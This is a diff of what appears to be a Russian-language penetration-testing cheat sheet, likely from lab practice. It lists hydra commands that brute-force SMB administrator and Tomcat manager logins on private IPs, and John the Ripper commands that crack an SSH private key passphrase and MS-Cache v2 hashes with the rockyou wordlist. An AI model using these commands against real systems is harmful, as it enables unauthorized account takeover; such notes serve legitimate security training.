@@ -28,10 +28,17 @@ hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
 
 hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html/   (перебор ВЕБ паролей)
 
-# метасплойт в метасплойт
+
 
 # Перебор хешей по словарю и брут
 
+***Взлом приватного ключа ssh
+
+ssh2john.py private.key > hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash_crack
+
+***
 john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash
 
 john --format=mscash2 --mask='?a' --min-length=7 --max-length=10 filehash
